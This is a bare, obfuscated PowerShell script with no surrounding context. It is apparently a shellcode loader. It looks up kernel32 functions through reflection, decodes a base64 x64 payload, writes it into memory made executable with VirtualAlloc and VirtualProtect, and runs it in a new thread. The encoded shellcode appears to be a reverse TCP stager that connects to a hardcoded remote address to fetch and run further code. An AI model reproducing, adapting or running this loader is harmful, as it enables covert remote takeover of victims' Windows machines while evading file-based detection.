function mA {
        Param ($dz, $wzJ)
        $kloS = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $kloS.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($kloS.GetMethod('GetModuleHandle')).Invoke($null, @($dz)))), $wzJ))
}

function dq {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $nb4,
                [Parameter(Position = 1)] [Type] $r2jDK = [Void]
        )

        $oJ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $oJ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $nb4).SetImplementationFlags('Runtime, Managed')
        $oJ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r2jDK, $nb4).SetImplementationFlags('Runtime, Managed')

        return $oJ.CreateType()
}

[Byte[]]$prSG = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAPAFQocODUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$hWXA = 0
$jD = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mA kernel32.dll VirtualAlloc), (dq @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $prSG.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($prSG, 0, $jD, $prSG.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mA kernel32.dll VirtualProtect), (dq @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($jD, [Uint32]$prSG.Length, 0x10, [Ref]$hWXA)) -eq $true) {
        $gPz = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mA kernel32.dll CreateThread), (dq @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jD,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mA kernel32.dll WaitForSingleObject), (dq @([IntPtr], [Int32]))).Invoke($gPz,0xffffffff) | Out-Null
}
